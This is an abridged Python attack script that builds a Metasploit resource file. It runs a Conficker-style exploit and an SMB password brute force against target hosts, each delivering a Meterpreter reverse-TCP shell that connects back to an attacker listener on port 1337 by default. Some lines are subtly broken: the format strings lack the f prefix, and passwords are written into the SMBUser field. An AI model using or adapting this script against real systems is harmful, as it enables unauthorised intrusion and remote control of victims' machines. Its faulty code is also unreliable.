...
def conficker_exploit(config_file, host, lhost, lport):
    ...
    config_file.write('set RHOST {str(host)}\n')
    config_file.write('set payload windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT {str(lport)}\n')
    config_file.write('set LHOST {lhost}\n')
    config_file.write('exploit -j -z\n')
...
def smb_brute(config_file, host, passwd_file, lhost, lport):
    ...
    with open(passwd_file) as file:
        for password in file.readlines():
            ...
            config_file.write('set SMBUser {str(password)}\n')
            config_file.write('set RHOST {str(host)}\n')
            config_file.write('set payload windows/meterpreter/reverse_tcp\n')
            config_file.write('set LPORT {str(lport)}\n')
            config_file.write('set LHOST {lhost}\n')
...
if __name__ == '__main__':
    with open('meta.rc', 'w') as metarc_file:
        ...
        parser.add_argument('-p', type=str, metavar='LPORT', default=1337,
        ...
        tgt_list = find_target(args.tgt_hosts)
        l_host = args.l
        l_port = args.p
        pass_file = args.f
